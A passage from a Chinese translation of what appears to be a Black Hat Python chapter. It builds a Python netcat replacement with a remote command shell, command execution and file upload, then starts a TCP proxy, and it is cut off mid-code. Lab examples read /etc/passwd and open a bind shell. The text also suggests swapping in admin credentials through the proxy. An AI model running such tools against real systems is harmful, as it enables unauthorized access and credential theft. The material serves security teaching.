class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.args.listen:</span><br><span class="line">            [<span class="number">3</span>] self.listen()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            [<span class="number">4</span>] self.send()</span><br></pre></td></tr></table></figure>

<p>我们使用命令行参数和缓冲区[1]初始化 <em>NetCat</em> 对象，然后创建套接字对象[2]。</p>
<p><em>run</em> 方法是管理 <em>NetCat</em> 对象的入口点，它的实现非常简单：它将执行分成两个方法。如果我们要设置一个监听器，我们调用 <em>listen</em> 类函数[3]。否则，我们调用 <em>send</em> 类函数[4]。</p>
<p>现在我们来写这个 <em>send</em> 类函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self)</span>:</span></span><br><span class="line">        [<span class="number">1</span>] self.socket.connect((self.args.target, self.args.port))</span><br><span class="line">        <span class="keyword">if</span> self.buffer:</span><br><span class="line">            self.socket.send(self.buffer)</span><br><span class="line">        [<span class="number">2</span>] <span class="keyword">try</span>:</span><br><span class="line">            [<span class="number">3</span>] <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                recv_len = <span class="number">1</span></span><br><span class="line">                response = <span class="string">''</span></span><br><span class="line">                <span class="keyword">while</span> recv_len:</span><br><span class="line">                    data = self.socket.recv(<span class="number">4096</span>)</span><br><span class="line">                    recv_len = len(data)</span><br><span class="line">                    response += data.decode()</span><br><span class="line">                    <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</span><br><span class="line">                        [<span class="number">4</span>] <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    print(response)</span><br><span class="line">                    buffer = input(<span class="string">'&gt; '</span>)</span><br><span class="line">                    buffer += <span class="string">'\n'</span></span><br><span class="line">                    [<span class="number">5</span>] self.socket.send(buffer.encode())</span><br><span class="line">        [<span class="number">6</span>] <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            print(<span class="string">'User terminated.'</span>)</span><br><span class="line">            self.socket.close()</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>我们连接到目标和端口[1]，如果我们有缓冲区信息，我们将它先发送给目标。然后我们设置一个 <em>try/catch</em> 块，这样我们就可以用 CTRL-C [2] 手动关闭连接。接下来，我们启动一个循环[3]来接收来自目标的数据。如果没有更多的数据，则跳出循环[4]。否则，我们打印响应的数据并暂停以获得交互式输入，发送该输入[5]，然后继续循环。</p>
<p>循环会一直继续，直到 <em>KeyboardInterrupt</em> 发生(CTRL-C) [6]，这会关闭套接字。</p>
<p>现在让我们编写当程序作为监听器运行时执行的类函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(self)</span>:</span></span><br><span class="line">        [<span class="number">1</span>] self.socket.bind((self.args.target, self.args.port))</span><br><span class="line">        self.socket.listen(<span class="number">5</span>)</span><br><span class="line">		[<span class="number">2</span>] <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, _ = self.socket.accept()</span><br><span class="line">            [<span class="number">3</span>] client_thread = threading.Thread(</span><br><span class="line">                target=self.handle, args=(client_socket,)</span><br><span class="line">            )</span><br><span class="line">            client_thread.start()</span><br></pre></td></tr></table></figure>

<p><em>listen</em> 类函数绑定到目标和端口[1]，并在循环[2]中开始监听，将连接的套接字传递给 <em>handle</em> [3]。</p>
<p>现在让我们实现文件上传、命令执行和创建交互式shell的逻辑功能。当作为监听器运行时，程序需要完成这些任务。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self, client_socket)</span>:</span></span><br><span class="line">        [<span class="number">1</span>] <span class="keyword">if</span> self.args.execute:</span><br><span class="line">            output = execute(self.args.execute)</span><br><span class="line">            client_socket.send(output.encode())</span><br><span class="line">        [<span class="number">2</span>] <span class="keyword">elif</span> self.args.upload:</span><br><span class="line">            file_buffer = <span class="string">b''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                data = client_socket.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    file_buffer += data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> open(self.args.upload, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(file_buffer)</span><br><span class="line">            message = <span class="string">f'Saved file <span class="subst">&#123;self.args.upload&#125;</span>'</span></span><br><span class="line">            client_socket.send(message.encode())</span><br><span class="line">        [<span class="number">3</span>] <span class="keyword">elif</span> self.args.command:</span><br><span class="line">            cmd_buffer = <span class="string">b''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    client_socket.send(<span class="string">b'BHP: #&gt; '</span>)</span><br><span class="line">                    <span class="keyword">while</span> <span class="string">'\n'</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer.decode():</span><br><span class="line">                        cmd_buffer += client_socket.recv(<span class="number">64</span>)</span><br><span class="line">                    response = execute(cmd_buffer.decode())</span><br><span class="line">                    <span class="keyword">if</span> response:</span><br><span class="line">                        client_socket.send(response.encode())</span><br><span class="line">                    cmd_buffer = <span class="string">b''</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(<span class="string">f'server killed <span class="subst">&#123;e&#125;</span>'</span>)</span><br><span class="line">                    self.socket.close()</span><br><span class="line">                    sys.exit()</span><br></pre></td></tr></table></figure>

<p><em>handle</em> 类函数执行与它接收到的命令行参数所对应的任务：完成命令执行、上传文件或启动shell。如果有一个命令需要执行[1]，<em>handle</em> 类函数将命令传递给 <em>execute</em> 函数，并将输出发送回套接字。如果要上传文件[2]，我们将设置一个循环来监听来自监听套接字上的内容，并接收数据，直到没有更多数据发送进来为止。然后将累积的内容写入指定的文件。最后，如果要创建shell [3]，我们也将设置一个循环，向发送者传递提示，并等待返回命令字符串。然后，我们使用 <em>execute</em> 函数执行命令，并将命令的输出返回给发送方。</p>
<p>您应该注意到了shell会扫描换行符，以确定何时处理命令，这使得它对 netcat 友好。也就是说，您可以在监听端使用此程序，在发送端使用netcat工具。但是，如果您要用Python客户端与之对话，请记住添加换行符。在 <em>send</em> 类函数中，您可以看到我们确实在从控制台获得输入之后添加了换行符。</p>
<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>(笔者注：Kicking the Tires是一种口语表达，指的是对一项投资进行最小限度的研究，而不是进行彻底和严格的分析。直译为踢轮胎，应该是比喻购车时简单看一看，踢一下轮胎验车)</p>
<p>现在让我们对它进行一些操作，以查看一些输出的情况。在一个终端或 <em>cmd.exe</em> 的shell中，使用 <em>–help</em> 参数运行脚本：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python netcat.py  --<span class="built_in">help</span></span><br><span class="line">usage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t TARGET] [-u UPLOAD]</span><br><span class="line">BHP Net Tool</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -c, --<span class="built_in">command</span>         initialize <span class="built_in">command</span> shell</span><br><span class="line">  -e EXECUTE, --execute EXECUTE</span><br><span class="line">                        execute specified <span class="built_in">command</span></span><br><span class="line">  -l, --listen          listen</span><br><span class="line">  -p PORT, --port PORT  specified port</span><br><span class="line">  -t TARGET, --target TARGET</span><br><span class="line">                        specified IP</span><br><span class="line">  -u UPLOAD, --upload UPLOAD</span><br><span class="line">                        upload file</span><br><span class="line">Example:</span><br><span class="line">      netcat.py -t 192.168.1.108 -p 5555 -l -c <span class="comment"># command shell</span></span><br><span class="line">      netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt <span class="comment"># upload to file</span></span><br><span class="line">      netcat.py -t 192.168.1.108 -p 5555 -l -e=<span class="string">"cat /etc/passwd"</span> <span class="comment"># execute command</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">'ABCDEFGHI'</span> | ./netcat.py -t 192.168.1.108 -p 135</span><br><span class="line">          <span class="comment"># echo local text to server port 135</span></span><br><span class="line">      netcat.py -t 192.168.1.108 -p 5555 <span class="comment"># connect to server</span></span><br></pre></td></tr></table></figure>

<p>现在，在你的Kali机上，使用它自己的IP和端口5555设置一个监听器，来提供一个命令行shell:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python netcat.py -t 192.168.1.203 -p 5555 -l -c</span><br></pre></td></tr></table></figure>

<p>现在在本地机器上启动另一个终端，并以客户端模式运行脚本。请记住，该脚本会从stdin读入，并将处于阻塞态直到它收到文件结束(EOF)标记。要发送EOF，请在键盘上键入CTRL-D键：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% python netcat.py -t 192.168.1.203 -p 5555</span><br><span class="line">CTRL-D</span><br><span class="line">&lt;BHP:<span class="comment">#&gt;  ls -la</span></span><br><span class="line">total 23497</span><br><span class="line">drwxr-xr-x 1 502 dialout      608 May 16 17:12 .</span><br><span class="line">drwxr-xr-x 1 502 dialout      512 Mar 29 11:23 ..</span><br><span class="line">-rw-r--r-- 1 502 dialout     8795 May  6 10:10 mytest.png</span><br><span class="line">-rw-r--r-- 1 502 dialout    14610 May 11 09:06 mytest.sh</span><br><span class="line">-rw-r--r-- 1 502 dialout     8795 May  6 10:10 mytest.txt</span><br><span class="line">-rw-r--r-- 1 502 dialout     4408 May 11 08:55 netcat.py</span><br><span class="line">&lt;BHP: <span class="comment">#&gt; uname -a</span></span><br><span class="line">Linux kali 5.3.0-kali3-amd64 <span class="comment">#1 SMP Debian 5.3.15-1kali1 (2019-12-09) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>您可以看到，我们收到了自定义的命令shell。因为我们是在Unix主机上，所以我们可以运行本地命令并接收命令运行的输出，就像我们通过SSH登录或者是在本地机器上一样。我们可以只使用 <em>-e</em> 参数在Kali机上执行相同的设置来让它执行一条命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python netcat.py -t 192.168.1.203 -p 5555 -l -e=<span class="string">"cat /etc/passwd"</span></span><br></pre></td></tr></table></figure>

<p>现在，当我们从本地机器连接到Kali时，我们会得到命令的输出结果:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% python netcat.py -t 192.168.1.203 -p 5555</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>我们也可以在本地机器上使用netcat:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% nc 192.168.1.203 5555</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>最后，我们可以使用客户端发送传统方式的请求:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -ne <span class="string">"GET / HTTP/1.1\r\nHost: reachtim.com\r\n\r\n"</span> |python ./netcat.py -t reachtim.com </span><br><span class="line">-p 80</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Mon, 18 May 2020 12:46:30 GMT</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line">Content-Length: 229</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: https://reachtim.com/</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;301 Moved Permanently&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Moved Permanently&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The document has moved &lt;a href=<span class="string">"https://reachtim.com/"</span>&gt;here&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>虽然这不是一种超强的技巧，但它是用Python编写一些客户端和服务器套接字并使用它们做坏事的良好基础。当然，这个程序只涵盖了基础知识；请运用你的想象力来扩展或改进它。接下来，让我们构建一个TCP代理，它在任何攻击场景中都很有用。</p>
<h2 id="构建TCP代理"><a href="#构建TCP代理" class="headerlink" title="构建TCP代理"></a>构建TCP代理</h2><p>在该工具中使用TCP代理有几个原因。您可以使用它来将流量从主机转发到主机，或者在评估基于网络的软件时使用。在企业环境中执行渗透测试时，您可能无法运行Wireshark;也不能加载驱动程序来嗅探Windows上的回路，而且网络间的隔离将阻止您直接在目标主机上运行您的工具。我们已经在各种情况下构建了像这样的简单的Python代理，以帮助您理解未知的协议，修改发送到应用程序的流量，并为fuzzers创建测试用例。</p>
<p>代理有几个活动部分。让我们总结一下需要编写的四个主要函数。我们需要将本地机器和远程机器之间的通信显示到控制台(<em>hexdump</em>)。我们需要从本地或远程机器(<em>receive _from</em>)的传入套接字接收数据。我们需要管理远程机器和本地机器之间的通信方向(<em>proxy_handler</em>)。最后，我们需要设置一个监听套接字，并将它传递给<em>proxy_handler</em> (<em>server_loop</em>)。</p>
<p>让我们开始吧，打开一个新文件并命名 <em>proxy.py</em> ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">[<span class="number">1</span>] HEX_FILTER = <span class="string">''</span>.join(</span><br><span class="line">    [(len(repr(chr(i))) == <span class="number">3</span>) <span class="keyword">and</span> chr(i) <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(src, length=<span class="number">16</span>, show=True)</span>:</span></span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">if</span> isinstance(src, bytes):</span><br><span class="line">    src = src.decode()</span><br><span class="line">    results = list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(src), length):</span><br><span class="line">        [<span class="number">3</span>] word = str(src[i:i+length])</span><br><span class="line">        [<span class="number">4</span>] printable = word.translate(HEX_FILTER)</span><br><span class="line">        hexa = <span class="string">' '</span>.join([<span class="string">f'<span class="subst">&#123;ord(c):<span class="number">02</span>X&#125;</span>'</span> <span class="keyword">for</span> c <span class="keyword">in</span> word])</span><br><span class="line">        hexwidth = length*<span class="number">3</span></span><br><span class="line">        [<span class="number">5</span>] results.append(<span class="string">f'<span class="subst">&#123;i:<span class="number">04</span>x&#125;</span>  <span class="subst">&#123;hexa:&lt;&#123;hexwidth&#125;</span>&#125;  <span class="subst">&#123;printable&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">if</span> show:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> results:</span><br><span class="line">            print(line)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>我们开始先导入了一些库。然后定义一个 <em>hexdump</em> 函数，它接受一些字节或字符串输入，并将hexdump输出到控制台。也就是说，它将输出包含十六进制值和ASCII的可打印字符的数据包的详细信息。这对于理解未知协议、查找明文协议中的用户凭据等都很有用。我们创建一个 <em>HEXFILTER</em> 字符串[1]，它包含ASCII可打印字符(如果存在)，或者如果不存在这样的表示则是一个点(.)。为了说明这个字符串可以包含什么，我们举个例子，看一下在交互式Python shell中两个整数30和65的字符表示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">65</span>)</span><br><span class="line"><span class="string">'A'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">30</span>)</span><br><span class="line"><span class="string">'\x1e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(repr(chr(<span class="number">65</span>)))</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(repr(chr(<span class="number">30</span>)))</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>65是可用字符表示是可打印的，而30则不能。像看到的这样，可打印字符的表示长度为3。我们根据这个情况来创建最终的 <em>HEXFILTER</em> 字符串:如果可以就转化为字符，否则用点(.)替代。</p>
<p>用于创建字符串的列表使用了Boolean 短路技术，这听起来很奇特。让我们分解一下:对于0到255范围内的每个整数，如果对应字符的长度等于3，我们用 <em>(chr(i))</em> 得到对应字符。否则，我们用一个点(.)。然后我们将该列表<em>join</em>连接成一个字符串，它看起来就像这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;................................ !&quot;#$%&amp;\&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJK</span><br><span class="line">LMNOPQRSTUVWXYZ[.]^_àbcdefghijklmnopqrstuvwxyz&#123;|&#125;~...........................</span><br><span class="line">.......¡¢£¤¥¦§¨©ª«¬.®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæç</span><br><span class="line">èéêëìíîïðñòóôõö÷øùúûüýþÿ&#39;</span><br></pre></td></tr></table></figure>

<p>列表推导式给出前256个整数的可打印字符表示。现在我们可以创建 <em>hexdump</em> 函数。首先，我们确保我们有一个字符串，如果在[2]中传入了一个字节字符串，则解码字节。然后我们获取要转储的字符串的一部分，并将其放入 <em>word</em> 变量[3]中。我们使用内置函数 <em>translate</em> 将每个字符的字符串表示替换为原始字符串(<em>printable</em>) [4]中相应的字符。同样，我们替换原始字符串中每个字符的整数值的十六进制表示(<em>hexa</em>)。最后，我们创建一个新数组来保存字符串<em>result</em>，该数组包含单词第一个字节索引的十六进制值、单词的十六进制值以及它的可打印表示形式[5]。输出是这样的:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; hexdump(<span class="string">'python rocks\n and proxies roll\n'</span>)</span><br><span class="line"><span class="number">0000</span>  <span class="number">70</span> <span class="number">79</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>F <span class="number">6</span>E <span class="number">20</span> <span class="number">72</span> <span class="number">6</span>F <span class="number">63</span> <span class="number">6</span>B <span class="number">73</span> <span class="number">0</span>A <span class="number">20</span> <span class="number">61</span> <span class="number">6</span>E   python rocks. an</span><br><span class="line"><span class="number">0010</span>  <span class="number">64</span> <span class="number">20</span> <span class="number">70</span> <span class="number">72</span> <span class="number">6</span>F <span class="number">78</span> <span class="number">69</span> <span class="number">65</span> <span class="number">73</span> <span class="number">20</span> <span class="number">72</span> <span class="number">6</span>F <span class="number">6</span>C <span class="number">6</span>C <span class="number">0</span>A      d proxies roll.</span><br></pre></td></tr></table></figure>

<p>这个函数为我们提供了一种实时监视通过代理的通信的方法。现在让我们创建一个函数，代理的两端将使用它来接收数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span><span class="params">(connection)</span>:</span></span><br><span class="line">    buffer = <span class="string">b""</span></span><br><span class="line">    [<span class="number">1</span>] connection.settimeout(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            [<span class="number">2</span>] data = connection.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            buffer += data</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br></pre></td></tr></table></figure>

<p>为了同时接收本地和远程数据，我们传入要使用的套接字对象。我们创建一个空字节字符串，<em>buffer<em>，它将从套接字[1]中积累回应。默认情况下，我们设置了5秒的超时时间，如果您正在将流量代理到其他国家或通过有损的网络，超时情况可能会很严重，因此需要增加设置的超时时间。我们设置了一个循环，将响应数据读入</em>buffer</em>[2]，直到没有更多数据或超时。最后，我们将<em>buffer</em>字节字符串返回给本地或远程的调用者。</p>
<p>有时，您可能希望在代理将响应包或请求包发送之前修改它们。让我们添加两个函数(<em>request_handler<em>和</em>response_handler</em>)来实现这一点:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="comment"># perform packet modifications</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="comment"># perform packet modifications</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br></pre></td></tr></table></figure>

<p>在这些函数中，您可以修改数据包内容、执行模糊任务、测试身份验证问题，或者做任何您想做的其他事情。例如，如果您发现正在发送明文用户凭据，并且希望通过使用<em>admin</em>而不是您自己的用户名来提高应用程序上的特权，这些函数会很有用。</p>
<p>现在让我们通过添加以下代码来深入了解 <em>proxy_handler</em> 函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span><span class="params">(client_socket, remote_host, remote_port, receive_first)</span>:</span></span><br><span class="line">    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    remote_socket.connect((remote_host, remote_port)) [<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> receive_first: [<span class="number">2</span>]</span><br><span class="line">        remote_buffer = receive_from(remote_socket)</span><br><span class="line">        hexdump(remote_buffer)</span><br><span class="line"></span><br><span class="line">    remote_buffer = response_handler(remote_buffer) [<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">        print(<span class="string">"[&lt;==] Sending %d bytes to localhost."</span> % len(remote_buffer))</span><br><span class="line">        client_socket.send(remote_buffer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        local_buffer = receive_from(client_socket)</span><br><span class="line">        <span class="keyword">if</span> len(local_buffer):</span><br><span class="line">            line = <span class="string">"[==&gt;]Received %d bytes from localhost."</span> % len(local_buffer)</span><br><span class="line">            print(line)</span><br><span class="line">            hexdump(local_buffer)</span><br><span class="line"></span><br><span class="line">            local_buffer = request_handler(local_buffer)</span><br><span class="line">            remote_socket.send(local_buffer)</span><br><span class="line">            print(<span class="string">"[==&gt;] Sent to remote."</span>)</span><br><span class="line"></span><br><span class="line">        remote_buffer = receive_from(remote_socket)</span><br><span class="line">        <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">            print(<span class="string">"[&lt;==] Received %d bytes from remote."</span> % len(remote_buffer))</span><br><span class="line">            hexdump(remote_buffer)</span><br><span class="line"></span><br><span class="line">            remote_buffer = response_handler(remote_buffer)</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">            print(<span class="string">"[&lt;==] Sent to localhost."</span>)</span><br><span class="line"></span><br><span class="line">        <span 